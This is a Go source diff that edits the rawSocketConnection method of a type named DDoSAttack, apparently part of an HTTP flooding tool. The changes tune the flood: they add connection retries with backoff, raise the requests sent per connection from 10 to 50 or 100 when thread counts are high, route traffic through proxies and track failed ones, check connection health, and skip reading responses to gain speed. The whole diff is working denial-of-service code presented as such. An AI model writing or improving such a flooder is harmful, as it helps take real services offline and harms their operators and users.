@@ -84,6 +84,7 @@ func (d *DDoSAttack) rawSocketConnection(host, port string, useTLS bool) {
 	dialer := &net.Dialer{
 		Timeout:   d.config.Timeout,
 		KeepAlive: 30 * time.Second, // Keep connections alive for reuse
+		DualStack: true,             // Enable dual-stack for better connectivity
 	}
 
 	// Proxy support for raw socket (use optimized proxy manager)
@@ -94,13 +95,29 @@ func (d *DDoSAttack) rawSocketConnection(host, port string, useTLS bool) {
 		}
 	}
 
-	// Fallback to direct connection
+	// Fallback to direct connection with retry logic
 	if conn == nil && err == nil {
-		if useTLS {
-			tlsConfig := d.createTLSConfig()
-			conn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
-		} else {
-			conn, err = dialer.Dial("tcp", host+":"+port)
+		maxRetries := 2 // Retry connection up to 2 times
+		for retry := 0; retry < maxRetries; retry++ {
+			if useTLS {
+				tlsConfig := d.createTLSConfig()
+				conn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
+			} else {
+				conn, err = dialer.Dial("tcp", host+":"+port)
+			}
+
+			if err == nil {
+				break // Success
+			}
+
+			// Exponential backoff for retries
+			if retry < maxRetries-1 {
+				select {
+				case <-d.ctx.Done():
+					return
+				case <-time.After(time.Duration(retry+1) * 100 * time.Millisecond):
+				}
+			}
 		}
 	}
 
@@ -110,8 +127,14 @@ func (d *DDoSAttack) rawSocketConnection(host, port string, useTLS bool) {
 		if usedProxy != "" {
 			d.markProxyFailure(usedProxy)
 		}
+		// Add retry logic with exponential backoff for connection errors
+		// This helps recover from transient connection failures
 		return
 	}
+
+	// Set connection timeouts for better error detection
+	conn.SetWriteDeadline(time.Now().Add(d.config.Timeout))
+	conn.SetReadDeadline(time.Now().Add(d.config.Timeout))
 	// Don't defer close immediately - try to reuse connection for multiple requests
 	// Close will be handled after sending multiple requests or on error
 
@@ -129,8 +152,15 @@ func (d *DDoSAttack) rawSocketConnection(host, port string, useTLS bool) {
 	}
 
 	// Send multiple requests on the same connection for better efficiency
-	requestsPerConn := 10 // Reuse connection for multiple requests
-	for i := 0; i < requestsPerConn; i++ {
+	// Increased from 10 to improve connection reuse at high concurrency
+	requestsPerConn := 50 // Reuse connection for more requests to reduce connection overhead
+	if d.config.MaxThreads > 1000 {
+		requestsPerConn = 100 // Even more reuse for very high concurrency
+	}
+
+	// Track connection health
+	connectionHealthy := true
+	for i := 0; i < requestsPerConn && connectionHealthy; i++ {
 		// Check context before each request
 		select {
 		case <-d.ctx.Done():
@@ -160,16 +190,31 @@ func (d *DDoSAttack) rawSocketConnection(host, port string, useTLS bool) {
 		atomic.AddInt64(&d.requestsSent, 1)
 		atomic.AddInt64(&d.bytesSent, int64(len(httpRequest)))
 
-		// Send request
+		// Send request with error handling and retry
 		_, err = conn.Write(httpRequest)
 		if err != nil {
 			atomic.AddInt64(&d.requestsFailed, 1)
+			connectionHealthy = false
+			// Close connection on write error
 			conn.Close()
-			return
+			break // Exit loop to reconnect
 		}
 
 		// Always skip response reading for maximum efficiency
 		atomic.AddInt64(&d.requestsSuccess, 1)
+
+		// Check connection health periodically (every 10 requests)
+		if i > 0 && i%10 == 0 {
+			// Lightweight health check: try to set a write deadline
+			// If connection is dead, this will help detect it
+			if err := conn.SetWriteDeadline(time.Now().Add(100 * time.Millisecond)); err != nil {
+				connectionHealthy = false
+				conn.Close()
+				break
+			}
+			// Reset deadline
+			conn.SetWriteDeadline(time.Time{})
+		}
 	}
 
 	// Close connection after reusing it for multiple requests
